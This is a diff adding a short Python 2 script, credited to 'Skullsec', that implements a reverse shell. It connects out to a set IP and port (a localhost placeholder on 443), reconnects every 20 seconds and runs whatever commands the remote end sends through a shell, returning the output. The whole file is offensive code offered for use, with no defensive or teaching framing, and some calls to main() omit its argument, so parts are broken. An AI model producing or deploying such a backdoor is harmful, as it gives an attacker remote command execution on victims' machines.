@@ -1,0 +1,56 @@
+#Feito por Skullsec
+# ----  DEBUTYSEC ----
+
+import socket, time, subprocess
+
+IP = "127.0.0.1"
+PORTA = 443
+
+def conectar(IP, PORTA):
+        try:
+                conexao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                conexao.connect((IP, PORTA))
+                conexao.send("Host conectado.\n")
+                return conexao
+        except Exception as e:
+               return None
+
+def escuta(conexao):
+        try:
+                while True:
+                        dados = conexao.recv(2048)
+                        if dados[:-1] == "/sair":
+                                conexao.close()
+                                exit(0)
+                        else:
+                                cmd(conexao, dados)
+        except:
+                erro(conexao)
+
+def cmd(conexao, dados):
+        try:
+                processo = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                saida = processo.stdout.read() + processo.stderr.read()
+                conexao.send(saida + '\n')
+        except:
+                erro(conexao)
+
+def main(conexao):
+        if conexao:
+                conexao.close()
+        while True:
+                conexao_on = conectar(IP, PORTA)
+
+                if conexao_on:
+                        escuta(conexao_on)
+                else:
+                        time.sleep(20)
+
+def erro(conexao):
+
+        if conexao:
+                conexao.close()
+        main()
+
+
+main()
